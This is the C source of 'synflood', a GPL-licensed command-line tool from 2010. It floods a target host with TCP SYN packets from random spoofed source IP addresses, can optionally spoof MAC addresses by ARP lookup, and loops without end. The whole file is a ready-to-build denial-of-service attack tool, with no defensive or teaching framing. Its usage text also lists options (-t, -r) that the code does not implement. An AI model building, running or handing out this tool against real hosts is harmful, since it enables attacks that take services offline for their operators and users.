/**
 * synflood.c
 *
 * Copyright (C) 2010 -  Wei-Ning Huang (AZ) <aitjcize@gmail.com>
 * All Rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <arpa/inet.h>
#include <getopt.h>
#include <libnet.h>
#include <net/if_arp.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <pcap.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IP_ADDR_LEN 4

#define LOG_IS_TYPE(level, type) ((level & type) == type)
#define LOG_INFO    0x01
#define LOG_MSG     0x02
#define LOG_FATAL   0x04
#define LOG_LIBNET  0x08
#define LOG_PCAP    0x10

#define PACKETS_PER_IP 1024

void usage(void);
void slog(int level, const char *fmt, ...);
void synflood(short* dp, int dp_count, u_int8_t* src_mac,
                  u_int32_t dst_ip, u_int8_t* dst_mac);
void build_arp(libnet_t* l, int op, u_int8_t* src_ip, u_int8_t* src_mac,
    u_int8_t* dst_ip, u_int8_t* dst_mac);
int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac);
void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
                                 const u_char* packet);

const char* program_name = "synflood";
const char* program_version = "0.1";

static struct option longopts[] = {
  { "interface",  required_argument, NULL, 'i' },
  { "mac",        required_argument, NULL, 'm' },
  { "mac-of-ip",  required_argument, NULL, 'M' },
  { "dest-ports", required_argument, NULL, 'p' },
  { "verbose",    no_argument,       NULL, 'v' },
  { "help",       no_argument,       NULL, 'h' },
};

/* flags */
int g_verbose_mode = 0;
int g_use_spoof_mac = 0;

/* global variables */
libnet_t* lnc = 0;
pcap_t* pcc = 0;
in_addr_t tgt_ip = 0;
struct libnet_ether_addr tgt_mac, spf_mac;
char* intf = NULL;                     /* interface */

typedef struct _ip_mac_pair {
  int complete;                  /* whether ip and mac are both specified */
  in_addr_t* ip;
  struct libnet_ether_addr* mac;
} ip_mac_pair;

int main(int argc, char *argv[])
{
  char err_buf[LIBNET_ERRBUF_SIZE > PCAP_ERRBUF_SIZE?
               LIBNET_ERRBUF_SIZE: PCAP_ERRBUF_SIZE];
  struct bpf_program bp;
  int opt = 0;
  char* spf_mac_str = 0;
  char* spf_mac_of_ip_str = 0;
  char* tgt_ip_str = 0;
  char* dst_ports_str = 0;
  short* dst_ports = 0;
  int dst_ports_count = 0;

  while ((opt = getopt_long(argc, argv, "i:m:M:p:hv", longopts, NULL)) != -1) {
    switch(opt) {
      case 'i':
        intf = optarg;
        break;
      case 'm':
        g_use_spoof_mac = 1;
        spf_mac_str = optarg;
        break;
      case 'M':
        g_use_spoof_mac = 1;
        spf_mac_of_ip_str = optarg;
        break;
      case 'p':
        dst_ports_str = optarg;
        break;
      case 'v':
        g_verbose_mode = 1;
        break;
      case 'h':
        usage();
        exit(0);
      default:
        usage();
        exit(1);
    }
  }

  /* check if use is root */
  if (getuid() && geteuid()) {
    fprintf(stderr, "%s: must run as root\n", program_name);
    exit(1);
  }

  if (!intf) {
    fprintf(stderr, "%s: must specify interface\n", program_name);
    exit(1);
  }

  if (optind == argc)
    slog(LOG_FATAL, "must specified host IP address\n");

  /* libnet init */
  if (g_use_spoof_mac)
    lnc = libnet_init(LIBNET_LINK_ADV, intf, err_buf);
  else
    lnc = libnet_init(LIBNET_RAW4, intf, err_buf);
  slog(LOG_INFO, "libnet_init()\n");

  /* pcap init */
  if (!(pcc = pcap_open_live(intf, 100, 0, 10, err_buf)))
    slog(LOG_PCAP, "pcap_open_live() error\n");
  slog(LOG_INFO, "pcap_open_live()\n");

  /* set capture filter */
  if (-1 == pcap_compile(pcc, &bp, "arp", 0, -1))
    slog(LOG_PCAP, "pcap_compile(): error\n");

  if (-1 == pcap_setfilter(pcc, &bp))
    slog(LOG_PCAP, "pcap_setfilter(): error\n");

  if (spf_mac_str) { /* spoof MAC address */
    struct ether_addr* ptr = ether_aton(spf_mac_str);
    if (!ptr) slog(LOG_FATAL, "invalid MAC address\n");
    memcpy(&spf_mac, ether_aton(spf_mac_str), ETHER_ADDR_LEN);
  } else if (spf_mac_of_ip_str) { /* spoof MAC address by IP */
    in_addr_t ip;
    if (-1 == (ip = libnet_name2addr4(lnc,spf_mac_of_ip_str,LIBNET_RESOLVE)))
      slog(LOG_LIBNET, "invalid IP address\n");
    if (!get_mac_by_ip(ip, &spf_mac))
      slog(LOG_FATAL, "can't resolve MAC address for %s\n",spf_mac_of_ip_str);
  }

  if (dst_ports_str) {
    int i = 0;
    for (i = 0; i < strlen(dst_ports_str); ++i)
      if (dst_ports_str[i] == ',') ++dst_ports_count;
    ++dst_ports_count;
    dst_ports = (short*) malloc(dst_ports_count * sizeof(int));
    dst_ports[0] = atoi(strtok(dst_ports_str, ","));
    for (i = 1; i < dst_ports_count; ++i)
      dst_ports[i] = atoi(strtok(NULL, ","));
  } else
    slog(LOG_FATAL, "must specify destination ports\n");

  tgt_ip_str = argv[optind];
  tgt_ip = libnet_name2addr4(lnc, tgt_ip_str, LIBNET_RESOLVE);

  if (g_use_spoof_mac && !get_mac_by_ip(tgt_ip, &tgt_mac))
    slog(LOG_FATAL, "can't resolve MAC address for %s\n",tgt_ip_str);

  synflood(dst_ports, dst_ports_count, (u_int8_t*)&spf_mac, tgt_ip,
           (u_int8_t*)&tgt_mac);

  return 0;
}

void synflood(short* dp, int dp_count, u_int8_t* src_mac,
                  u_int32_t dst_ip, u_int8_t* dst_mac) {

  libnet_ptag_t tcp_tag = 0, ip_tag = 0;
  u_int32_t src_ip = 0;
  u_int16_t sp = 0;
  int count = PACKETS_PER_IP;
  int build_ethernet = g_use_spoof_mac;
  int port_sw = 0;

  slog(LOG_MSG, "flooding in progress...\n");
  while (1) {
    if (-1 == (tcp_tag = libnet_build_tcp(   /* build TCP header */
        sp = libnet_get_prand(LIBNET_PRu16), /* source port */  
        dp[port_sw],                         /* destination port */
        libnet_get_prand(LIBNET_PRu32),      /* sequence number */
        libnet_get_prand(LIBNET_PRu32),      /* acknowledgement number */
        TH_SYN,                              /* control flags */
        libnet_get_prand(LIBNET_PRu16),      /* window size */
        0,                                   /* checksum */
        0,                                   /* urgent pointer */
        LIBNET_TCP_H,                        /* total length */
        NULL,                                /* payload */
        0,                                   /* payload length or 0 */
        lnc,                                 /* libnet context */
        tcp_tag                              /* ptag protocol tag */
    ))) slog(LOG_LIBNET, "can't build TCP header\n");

    /* update new IP address and dest_port every N packet */
    if (count == PACKETS_PER_IP) {
      port_sw = (port_sw == dp_count -1)? 0: port_sw +1;
      count = 0;
      if (-1 == (ip_tag = libnet_build_ipv4( /* build IP header */
          LIBNET_TCP_H + LIBNET_IPV4_H,      /* total length */
          0,                                 /* type of service bits */
          libnet_get_prand(LIBNET_PRu16),    /* IP identification number */
          IP_DF,                             /* fragmentation bits and offset */
          255,                               /* time to live in the network */
          IPPROTO_TCP,                       /* upper layer protocol: (TCP)*/
          0,                                 /* checksum */
          src_ip = libnet_get_prand(LIBNET_PRu32), /* source IPv4 address */
          dst_ip,                            /* destination IPv4 address */
          NULL,                              /* optional payload or NULL */
          0,                                 /* payload length or 0 */
          lnc,                               /* libnet context */
          ip_tag                             /* ptag protocol tag */
      ))) slog(LOG_LIBNET, "can't build IP header\n");
    }

    if (build_ethernet) {
      build_ethernet = 0;
      if (-1 == libnet_build_ethernet( /* create ethernet header */
          dst_mac,                     /* dest mac addr */
          src_mac,                     /* source mac addr */
          ETHERTYPE_IP,                /* protocol type */
          NULL,                        /* payload */
          0,                           /* payload length */
          lnc,                         /* libnet context */
          0                            /* 0 to build a new one */
      )) slog(LOG_LIBNET, "can't build ethernet header\n");
    }

    if (-1 == libnet_write(lnc))
      slog(LOG_LIBNET, "can't send packet\n");

    slog(LOG_INFO, "%s:%5hu ---> %s:%5hu\n",
        libnet_addr2name4(src_ip, LIBNET_DONT_RESOLVE),
        sp,
        libnet_addr2name4(dst_ip, LIBNET_DONT_RESOLVE),
        dp[port_sw]
    );
    ++count;
  }
}

void build_arp(libnet_t* l, int op, u_int8_t* src_ip, u_int8_t* src_mac,
    u_int8_t* dst_ip, u_int8_t* dst_mac) {

  libnet_ptag_t p_tag;

  p_tag = libnet_build_arp(      /* construct arp packet */
      ARPHRD_ETHER,              /* hardware type ethernet */
      ETHERTYPE_IP,              /* protocol type */
      ETHER_ADDR_LEN,            /* mac length */
      IP_ADDR_LEN,               /* protocol length */
      op,                        /* op type */
      src_mac,                   /* source mac addr */
      src_ip,                    /* source ip addr */
      dst_mac,                   /* dest mac addr */
      dst_ip,                    /* dest ip addr */
      NULL,                      /* payload */
      0,                         /* payload length */
      l,                       /* libnet context */
      0                          /* 0 stands to build a new one */
  );

  if (-1 == p_tag)
    slog(LOG_LIBNET, "can't build arp header\n");

  if (op == ARPOP_REQUEST)
    dst_mac = (u_int8_t*)"\xff\xff\xff\xff\xff\xff";

  p_tag = libnet_build_ethernet( /* create ethernet header */
      dst_mac,                   /* dest mac addr */
      src_mac,                   /* source mac addr */
      ETHERTYPE_ARP,             /* protocol type */
      NULL,                      /* payload */
      0,                         /* payload length */
      l,                       /* libnet context */
      0                          /* 0 to build a new one */
  );

  if (-1 == p_tag)
    slog(LOG_LIBNET, "can't build ethernet header\n");
}

int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac) {
  int i = 0;
  ip_mac_pair imp = {0, &ip, mac};
  char err_buf[LIBNET_ERRBUF_SIZE];
  libnet_t* l = libnet_init(LIBNET_LINK_ADV, intf, err_buf);

  slog(LOG_INFO, "resolving MAC address for %s\n",
       libnet_addr2name4(ip, LIBNET_DONT_RESOLVE));
  in_addr_t local_ip = libnet_get_ipaddr4(l);
  struct libnet_ether_addr* local_mac = libnet_get_hwaddr(l);

  if (local_mac == NULL)
    slog(LOG_LIBNET, "can't resolve MAC address for localhost\n");

  build_arp(l, ARPOP_REQUEST, (u_int8_t*)&local_ip, (u_int8_t*)local_mac,
               (u_int8_t*)&ip, (u_int8_t*)"\x00\x00\x00\x00\x00\x00");

  slog(LOG_MSG, "%s: 42 bytes, broadcasting: Who has %s? Tell %s\n", intf,
       libnet_addr2name4(ip, LIBNET_DONT_RESOLVE),
       libnet_addr2name4(local_ip, LIBNET_DONT_RESOLVE));

  do {
    /* send arp request */
    if (-1 == libnet_write(l))
      slog(LOG_LIBNET, "can't send packet\n");

    /* capture arp reply */
    *mac->ether_addr_octet = 0;
    pcap_dispatch(pcc, 1, arp_packet_handler_cb, (u_char*) &imp);
    if (imp.complete) {
      libnet_clear_packet(l);
      return 1;
    }
    usleep(100000);
  } while (++i < 30); /* try for 3 seconds */

  libnet_clear_packet(lnc);
  return 0;
}

void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
                                 const u_char* packet) {
  struct libnet_802_3_hdr *h_eth;
  struct libnet_arp_hdr *h_arp;

  h_eth = (void*)packet;
  h_arp = (void*)((char*)h_eth + LIBNET_ETH_H);

  if ((htons(h_arp->ar_op) == ARPOP_REPLY)
      && (htons(h_arp->ar_pro) == ETHERTYPE_IP)
      && (htons(h_arp->ar_hrd) == ARPHRD_ETHER)) {
    in_addr_t ip;
    memcpy(&ip, (char*)h_arp + LIBNET_ARP_H + h_arp->ar_hln, 4);
    if (memcmp(&ip, ((ip_mac_pair*)imp)->ip, IP_ADDR_LEN) == 0) {
      memcpy(((ip_mac_pair*)imp)->mac, h_eth->_802_3_shost, ETHER_ADDR_LEN);
      ((ip_mac_pair*)imp)->complete = 1;
      int c = 0;
      slog(LOG_MSG, "%s: %d bytes, received: %s is at ", intf, pkinfo->len,
          libnet_addr2name4(ip, LIBNET_DONT_RESOLVE));
      for (c = 0; c < 6; c++)
        slog(LOG_MSG, "%.2x%c", ((u_char*)((ip_mac_pair*)imp)->mac)[c],
               (c < 5)? ':': '\n');
      return;
    }
  }
}

void slog(int level, const char *fmt, ...) {
  va_list vap;

  if (LOG_IS_TYPE(level, LOG_INFO) && !g_verbose_mode)
    return;

  if (LOG_IS_TYPE(level, LOG_LIBNET)) {
    char* tmp = libnet_geterror(lnc);
    if (tmp && strlen(tmp) != 0)
      fprintf(stderr, "%s: %s\n", program_name, tmp);
  }

  if (LOG_IS_TYPE(level, LOG_PCAP)) {
    char* tmp = pcap_geterr(pcc);
    if (tmp && strlen(tmp) != 0)
      fprintf(stderr, "%s: %s\n", program_name, tmp);
  }

  if (LOG_IS_TYPE(level, LOG_MSG)) {
    va_start(vap, fmt);
    vfprintf(stdout, fmt, vap);
    va_end(vap);
  } else {
    fprintf(stderr, "%s: ", program_name);
    va_start(vap, fmt);
    vfprintf(stderr, fmt, vap);
    va_end(vap);
  }

  if (!LOG_IS_TYPE(level, LOG_INFO) && !LOG_IS_TYPE(level, LOG_MSG))
    exit(1);
}

void usage(void) {
  fprintf(stderr, "%s %s, by Wei-Ning Huang <aitjcize@gmail.com>\n",
      program_name, program_version);
  fprintf(stderr, "Usage: %s [-v] [-i interface] [-t target] [-r redirect] "
                  "[-m mac] [-M IP]                  target\n\n",
                  program_name);
  fprintf(stderr,
"  -i, --interface   interface\n"
"  -m, --mac         use alternate MAC (for LAN only)\n"
"  -M, --mac-of-ip   use alternate MAC of the ip IP (for LAN only)\n"
"  -v, --vebose      verbose mode\n"
"  -h, --help        show this help list\n"
"  target            target IP\n");
}
